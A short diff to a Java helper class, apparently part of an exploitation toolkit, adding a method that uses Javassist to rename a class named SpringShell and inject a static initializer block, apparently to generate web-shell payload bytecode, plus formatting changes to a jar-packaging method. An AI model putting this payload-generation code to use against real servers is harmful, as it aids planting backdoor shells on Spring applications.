@@ -33,15 +33,26 @@ public class ClassFiles {
         return cc.toBytecode();
     }
 
-    public static byte[] makeJarWithMultiClazz(String jarname, Map<String, byte[]> bytecodes){
-        try(ZipOutputStream zipout = new ZipOutputStream(new FileOutputStream(jarname))){
-            for(Map.Entry<String, byte[]> clazz:bytecodes.entrySet()){
+
+    public static byte[] makeClassWithSpringShell(String classname, String body) throws Exception {
+        ClassPool pool = new ClassPool(true);
+        pool.appendClassPath(new ClassClassPath(shell.SpringShell.class));
+        CtClass cc = pool.getCtClass(shell.SpringShell.class.getName());
+        cc.setName(classname);
+        insertStaticBlock(cc, body);
+        return cc.toBytecode();
+    }
+
+
+    public static byte[] makeJarWithMultiClazz(String jarname, Map<String, byte[]> bytecodes) {
+        try (ZipOutputStream zipout = new ZipOutputStream(new FileOutputStream(jarname))) {
+            for (Map.Entry<String, byte[]> clazz : bytecodes.entrySet()) {
                 String classname = clazz.getKey();
                 byte[] bytecode = clazz.getValue();
-                if(classname.endsWith(".class")){
+                if (classname.endsWith(".class")) {
                     classname = classname.replaceFirst("\\.class$", "");
                 }
-                classname = classname.replace(".","/");
+                classname = classname.replace(".", "/");
                 classname += ".class";
                 ZipEntry entry = new ZipEntry(classname);// 填充文件内容
                 zipout.putNextEntry(entry);
